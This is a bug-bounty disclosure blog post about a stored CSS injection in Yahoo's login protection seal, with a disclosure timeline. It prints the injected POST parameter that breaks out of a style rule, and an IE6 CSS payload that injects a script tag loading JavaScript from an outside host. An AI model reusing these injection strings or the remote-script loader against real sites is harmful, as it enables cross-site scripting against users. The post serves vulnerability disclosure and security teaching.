---
source: zlz-buerhaus
source_url: https://buer.haus/2016/04/18/yahoo-login-protection-seal-stored-css-injection/
title: "Yahoo Login Protection Seal – Stored CSS Injection | ziot"
---

[< Back](https://buer.haus/)

![](https://i.imgur.com/yqgfZMW.jpg)

In 2014 I discovered a vulnerability on Yahoo's Login Protection seal that allowed for CSS injection. This information was saved to the browser and IP, persisting across login sessions on that computer. The protection seal feature has since been removed from the login page, but the feature still exists in your account preferences.

**Yahoo Protection Seal**

[https://protect.login.yahoo.com/login/set\_pref](https://protect.login.yahoo.com/login/set_pref)

**"Protect users on this computer against password theft with a sign-in seal."**\- Yahoo

The Yahoo protection seal feature allows you to create a customized seal consisting of 3 words, colors, or an image. Only you know the seal you created, so you know if any Yahoo login presented to you is legitimate or not. If you are redirected to a Yahoo login phishing attempt, you would not see your seal and immediately know there is a problem.

![](https://i.imgur.com/tkc2BHe.jpg) Creating a protection seal with text and colors.

In the above photo you can see that you are able to input three strings and select a seal color from a list of 29 pre-defined colors. You are able to preview your seal on the page before saving it to your account, computer, and IP address. This is what the protection seal looked like when it was on the login page:

![](https://i.imgur.com/RGkScbY.jpg)

This is a nifty feature that not many websites are using. It's unfortunate that the feature on Yahoo was somewhat buried into account settings in a location that not many people knew about or explored to.

**Technical Details**

When you preview or save your seal with text and colors, this is what the request looks like. For the intents of simplicity, I converted the multi-part form data into simple POST vars:

URL: https://protect.login.yahoo.com/login/set\_pref

POST:

```
colorPickerState=1&prevBadgeOriginalUrl=da4d31126f03b00f7f366981b5b11ae9/20914242585805polrpda0alkb.gif&.crumb=&.src=&.intl=us&.u=&.done=https://login.yahoo.com?.src=&.intl=us&.partner=&pkg=&stepid=&.pd=&.partner&pkg&stepid&prevBadgeType=2&prevBadgeText[]=This&prevBadgeText[]=Is&prevBadgeText[]=a test&strBadgeImage=[file]&prevBadgeColor=ffa07a&.preview=1
```

While there are many POST vars here that are interesting to explore, the one that jumps out immediately is that the color you selected is sent as hex. For a pre-defined list of 0-18, you would expect that list to simply be listed as int 0, 1, 2, etc. The fact you can specify a hex color suggests you may be able to use a color outside of that list. That was the mentality that led me towards the vulnerability.

The first thing I checked was to see if ffa07a is stored anywhere on the page. It was possible they had a pre-defined set of classes for these 19 colors which may not have been exploitable. But if not that, they were most likely not generating a dynamic CSS stylesheet. So my initial guess was that it was embedded in a <style> tag on any page that displayed the login seal.

```
<style type="text/css">
.badge{background-image:url(https://s.yimg.com/lq/i/reg/bdg_01_ffa07a.gif)}
.badge img.picture{border-color:#ffa07a;}
#loading #previewpane #previewgraphic {top:50%}
</style>
```

Far more curious than I had originally thought! Not only are they embedding the color in a <style> CSS rule, but they are also embedding the color in a background image url path. The next step was to test I tried immediately after was to see if I could break out and write my own CSS rule:

POST: prevBadgeColor=333333;}body{background:#000;}

Sure enough, this changed the background color:

![](https://i.imgur.com/WfgkdMh.png)

Source:

```
<style type="text/css">
.badge{background-image:url(https://s.yimg.com/lq/i/reg/bdg_01_333333;}body{background:#000;}.gif)}
.badge img.picture{border-color:#333333;}body{background:#000;}}
#loading #previewpane #previewgraphic {top:50%}
</style>
```

The logical next step is to see if you can just escape out of <style> and write your own html to achieve a Stored Cross-Site Scripting (XSS) attack. Which was tried and failed. They are escaping the special characters we would need to achieve that, but not all of them. Being limited to <style> injection limited the impact of this vulnerability, but it was still an interesting exploit to discover.

Probably the most interesting result is from older browsers such as IE6 allowing you to execute JavaScript from CSS rules. Because these are such old browsers, this attack vector is considered out of scope for many company's bug bounty programs.

Due to the characters that were escaped, this is what an IE6 javascript payload looked like:

```
); } body { background: url(javascript:var x = String(/script/); var y = String(/https:!!secure.mrzioto.com!yahoo.js/); var z = String(/head/); var a = String.fromCharCode(47); var b = String(); x = x.substring(1, x.length-1); y = y.substring(1, y.length-1); z = z.substring(1, z.length-1); a = a.substring(1, a.length-1); y = y.replace(/!/g, a); var jq = document.createElement(x);jq.src = y; document.getElementsByTagName(z)[0].appendChild(jq);) !important; } /*
```

Result:

![](https://i.imgur.com/O0nt8gv.png)IE6 CSS Injected XSS on Yahoo Login

```

```

**Modern Browser Impact**

I don't want to dive too deep into the topic of what is exploitable with malicious CSS but a recent article by James Kettle on PortSwigger provides a lot of great insight there: [http://blog.portswigger.net/2015/02/prssi.html](http://blog.portswigger.net/2015/02/prssi.html). Probably the most interesting attack vector is being able to extract page contents via CSS selector bruteforcing. A good example of that can be found here: [http://eaea.sirdarckcat.net/cssar/v2/](http://eaea.sirdarckcat.net/cssar/v2/)

**Timeline**

Reported: July 16, 2014

Report moved to ineligible (login seal was deprecated, so "fixed"): January 14, 2015